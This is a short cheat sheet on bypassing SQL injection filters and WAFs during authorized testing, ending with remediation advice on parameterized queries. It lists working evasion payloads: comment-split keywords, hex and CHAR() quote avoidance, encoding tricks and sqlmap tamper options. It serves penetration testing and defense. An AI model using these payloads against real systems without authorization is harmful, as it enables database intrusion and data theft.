# SQL Injection Filter Bypass (Authorized Testing Only)

> Authorized scope only. Prefer **read-only, non-destructive** proofs (e.g. version/boolean differential). Never run destructive statements.

## Confirm before bypassing
- Boolean differential: `' AND 1=1-- -` vs `' AND 1=2-- -`
- Error-based marker, time-based (`SLEEP`/`pg_sleep`) if blind.

## Whitespace alternatives (when spaces are filtered)
```
/**/        ->  SELECT/**/name/**/FROM/**/users
%0a %0b %0c %0d %09  (newline/tab variants)
()          ->  SELECT(name)FROM(users)
```

## Keyword filtering
```sql
-- case
SeLeCt / UnIoN
-- inline comments split keyword (MySQL)
UNI/**/ON SEL/**/ECT
-- double keyword (naive strip-once)
UNIONUNION  ->  removes inner, leaves UNION
SELSELECTECT
-- equivalent operators
AND  -> &&      OR -> ||
=    -> LIKE / <=> / REGEXP
```

## Quote filtering
```sql
-- no quotes needed with numeric context or hex/char
WHERE id=0x61646d696e        -- 'admin' as hex (MySQL)
WHERE name=CHAR(97,100,109,105,110)
```

## Comment / terminator variants
```
-- -     #     /*comment*/     ;%00
```

## WAF-oriented tips
- Scientific notation / inline casts to confuse tokenizers.
- Mixed encoding (URL-encode selective chars the WAF normalizes differently than the DB driver).
- Chunked requests / parameter pollution where the WAF and app parse differently.
- `sqlmap --tamper=space2comment,between,charencode` (authorized targets only) automates many of these.

## Remediation (the real fix)
- **Parameterized queries / prepared statements** everywhere — this eliminates the class, regardless of WAF.
- ORM with bound parameters; never string-concatenate SQL.
- Least-privilege DB accounts; disable stacked queries where possible.
- WAF as defense-in-depth only.
